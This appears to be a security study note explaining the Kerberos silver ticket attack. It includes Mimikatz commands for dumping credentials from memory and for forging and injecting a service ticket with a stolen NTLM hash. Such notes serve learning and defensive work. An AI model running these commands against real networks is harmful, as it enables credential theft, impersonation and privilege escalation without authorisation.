### General Notes

An attacker who possesses the password hash of a service account may forge [[Kerberos]] *TGS*s, also known as **silver tickets**.
- Since the attacker controls the entire content of the forged ticket, they can impersonate any user while accessing that service.

Important to note that there is no communication with the [[Domain Controller]], it is directly presented to the service.

> The end goal is probably to do privilege escalation through that compromised service.

---
### Attack Path

The attacker extracts the [[NTLM]] hash of the targeted service account using credential dumping tools like Mimikatz:
```
mimikatz # sekurlsa::logonpasswords
```
- Needs to be local admin to execute this.

The attacker then creates the **silver ticket** using the extracted hash for the targeted service:
```
mimikatz # kerberos::golden /domain:<domain> /sid:<domain-SID> 
/target:<target-server> /service:<service-type> /rc4:<NTLM_HASH> 
/user:<username-to-impersonate> /ptt
```
- The `target` server is the server hosting the service.

> The attacker then injects this ticket into the session, which is done automatically by Mimikatz. Can use `klist` to list the current tickets.

---


